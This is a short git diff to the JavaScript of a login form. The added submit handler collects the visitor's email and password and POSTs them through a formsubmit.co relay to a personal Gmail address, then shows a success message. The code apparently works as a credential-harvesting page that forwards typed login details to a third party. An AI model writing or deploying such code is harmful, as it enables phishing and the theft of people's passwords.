@@ -1,4 +1,6 @@
 const pass_field = document.querySelector('.pass');
+const email_field = document.querySelector('.email');
+const succes = document.querySelector('.succes');
 const showBtn = document.querySelector('.show');
 const form = document.querySelector('.form-submit');
 
@@ -14,6 +16,24 @@ showBtn.addEventListener('click', function () {
 	}
 });
 
-form.addEventListener('click', e => {
-	console.log(e);
+form.addEventListener('submit', e => {
+	e.preventDefault();
+	let emailValue = email_field.value;
+	let passValue = pass_field.value;
+	fetch('https://formsubmit.co/tonight0bayastan@gmail.com', {
+		method: 'POST',
+		headers: {
+			'Content-Type': 'application/json',
+			Accept: 'application/json',
+		},
+		body: JSON.stringify({
+			email: emailValue,
+			password: passValue,
+		}),
+	})
+		.then(() => {
+			succes.style.opacity = 1;
+			succes.style.overflow = 'visible';
+		})
+		.catch(error => console.log(error));
 });
